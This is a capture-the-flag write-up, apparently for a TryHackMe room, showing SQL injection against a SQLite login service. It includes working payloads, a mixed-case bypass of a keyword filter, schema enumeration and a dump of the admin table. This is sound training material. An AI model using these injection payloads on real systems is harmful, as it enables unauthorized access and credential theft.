## Reading the Flag

The application on port 1337 is a database. Entering the username `smokey` from the room description returns a password. Entering a non-existing username returns `Username not found`.
```
$ nc 10.x.x.x 1337
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: doesnotexist
Username not found.
```
I test the application for SQL-Injection:
```
Welcome to the Light database!
Please enter your username: smokey' or 1=1
Error: unrecognized token: "' LIMIT 30"
Please enter your username: smokey' or '1'='1
Password: tF8tj2o94WE4LKC
Please enter your username: smokey' and sqlite_version()=sqlite_version() and '1'='1
Password: vYQ5ngPpw8AdUmL
```
I try union based injection, but there is a keyword filter. It can be bypassed by combining lower and upper case letters:
```
Please enter your username: UNION
Ahh there is a word in there I don't like :(
Please enter your username: union
Ahh there is a word in there I don't like :(
Please enter your username: Union
Username not found.
```
I extract the table names and table schemas: 
```
Please enter your username: smokey' Union Select group_concat(name) From sqlite_master Where type='table
Password: usertable,admintable
Please enter your username: smokey' Union Select sql From sqlite_master Where type!='meta' And sql Not Null And name='admintable' And '1'='1
Password: CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
```
I retrieve the admin username, the admin password and the Flag by dumping the table `admintable`:
```
Please enter your username: smokey' Union Select group_concat(id || ':' || username || ':' || password) From admintable Where '1'='1
Password: 1:TryHackMeAdmin:<REDACTED>,2:flag:THM{<REDACTED>}
```
